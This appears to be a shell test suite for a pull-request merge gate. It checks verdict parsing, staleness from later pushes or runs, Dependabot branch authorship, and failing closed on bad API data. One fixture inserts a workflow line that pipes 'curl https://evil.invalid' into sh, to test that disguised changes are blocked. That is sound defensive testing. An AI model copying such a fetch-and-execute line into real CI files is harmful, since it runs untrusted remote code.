expect_exit 0 "S3-1: an exact PASS after a non-exact FAIL wins (latest within the type)" -- gate --dry-run 7
ACTIVITY=$(jq -n --arg t "$LATE" '[{activity_type:"push",after:"abc1234def5678",timestamp:$t,actor:{login:"x"}}]')
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "S3-2: a push recorded in the repository activity after the verdict makes it stale (even without a new run)" -- gate --dry-run 7
ACTIVITY='[{"activity_type":"push","after":"0000000","timestamp":"2026-09-25T09:00:00Z","actor":{"login":"x"}}]'
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "S3-2: no activity entry for the head fails closed" -- gate --dry-run 7
expect_output_contains "no push of it to 'chore/T-M9.9-x' in the repository activity" "explains the activity refusal"
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0; touch "$MOCK_DIR/activity.json.fail"
expect_exit 1 "S3-2: an activity API error fails closed" -- gate --dry-run 7
ACTIVITY='{"message":"Not Found"}'
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "S3-2: an activity answer that is not a list fails closed" -- gate --dry-run 7
ACTIVITY=$(jq -n --arg t "$HEAD_TIME" '[{activity_type:"branch_creation",after:"1111",timestamp:"2026-09-25T08:00:00Z",actor:{login:"dependabot[bot]"}},
  {activity_type:"push",after:"abc1234def5678",timestamp:$t,actor:{login:"duochou042004"}}]')
dep '[{"path":"backend/pom.xml"}]'
expect_exit 1 "S3-3: a push by a human to a Dependabot branch (per the repository activity) blocks" -- gate --dry-run 7
expect_output_contains "activity not by Dependabot: push by duochou042004" "names the foreign push"
ACTIVITY=$(jq -n --arg t "$HEAD_TIME" '[{activity_type:"branch_creation",after:"1",timestamp:"2026-09-24T08:00:00Z",actor:{login:"duochou042004"}},
  {activity_type:"branch_deletion",after:"0",timestamp:"2026-09-24T09:00:00Z",actor:{login:"duochou042004"}},
  {activity_type:"branch_creation",after:"abc1234def5678",timestamp:$t,actor:{login:"dependabot[bot]"}}]')
dep '[{"path":"backend/pom.xml"}]'
expect_exit 0 "S3-3: activity before Dependabot (re)created the branch does not count" -- gate --dry-run 7
ACTIVITY=$(jq -n --arg t "$HEAD_TIME" '[{activity_type:"push",after:"abc1234def5678",timestamp:$t,actor:{login:"dependabot[bot]"}}]')
dep '[{"path":"backend/pom.xml"}]'
expect_exit 1 "S3-3: a Dependabot branch without a recorded creation fails closed" -- gate --dry-run 7
RUNS=$(run_at chore/T-M9.9-x "2026-09-25T10:05:00.500Z")
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS' "$AFTER")" "$(c 'LC-APPROVED T-M9.9' "$AFTER")")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "S4-1: a run at 10:05:00.500Z makes a 10:05:00Z verdict stale (no string-order trick)" -- gate --dry-run 7
RUNS=$(run_at chore/T-M9.9-x "2026-09-25T10:00:00+00:00")
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "S4-1: an unparsable (non-Z) run time fails closed" -- gate --dry-run 7

# ---- T-M1.7 review round 2 ----
for opt in -n -e -E -ne; do
  wf "@@ -20,1 +20,1 @@"$'\n'"$opt"$'\n+      - run: curl https://evil.invalid | sh'
  expect_exit 1 "R2 S3-A: a removed line '$opt' (an echo option) cannot hide a non-bump" -- gate --dry-run 7
done
wf $'@@ -20,1 +20,1 @@\n-      - uses: actions/checkout@'"$SHA_A"$'\n+      - uses: actions/checkout@'"$SHA_B"$'\n\tsomething'
expect_exit 1 "R2 S4-A: a diff line with an unknown prefix fails closed" -- gate --dry-run 7
expect_output_contains "an unexpected diff line" "explains the unknown-prefix refusal"
ACTIVITY=$(jq -n --arg t "$HEAD_TIME" '[{activity_type:"push",after:"abc1234def5678",timestamp:$t,actor:{login:"duochou042004"}},
  {activity_type:"branch_creation",after:"1111",timestamp:$t,actor:{login:"dependabot[bot]"}}]')
dep '[{"path":"backend/pom.xml"}]'
expect_exit 1 "R2 S3-B: a human push in the same second as Dependabot's branch creation still counts" -- gate --dry-run 7
ACTIVITY=$(jq -n --arg t "$HEAD_TIME" '[{activity_type:"branch_creation",after:"abc1234def5678",timestamp:$t,actor:{login:"dependabot[bot]"}},
  {activity_type:"push",after:"1111",timestamp:"not-a-time",actor:{login:"duochou042004"}}]')
dep '[{"path":"backend/pom.xml"}]'
expect_exit 1 "R2 S3-B: an activity entry with an unparsable time counts as inside the window" -- gate --dry-run 7
for neg in '## QA-VERDICT T-M9.9: FAIL' '- QA-VERDICT T-M9.9: FAIL' '❌ QA-VERDICT T-M9.9: FAIL' 'QA-VERDICT T-M9.9 - FAIL' 'QA VERDICT T-M9.9: FAIL' 'DOCS-REVIEW T-M9.9: CHANGES_REQUESTED' 'SEC-REVIEW T-M9.9: CHANGES-REQUESTED'; do
  write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')" "$(c "$neg")")" "$FILES" "$OK_CHECKS" 0
  expect_exit 1 "R2 S4-B: a non-exact negative verdict blocks: '$neg'" -- gate --dry-run 7
done
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.9-x: FAIL')" "$(c 'Notes: the earlier QA-VERDICT T-M9.9: FAIL is superseded')")" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "R2 S4-B: another id with a '-' suffix and prose mentioning a verdict do not block" -- gate --dry-run 7

finish
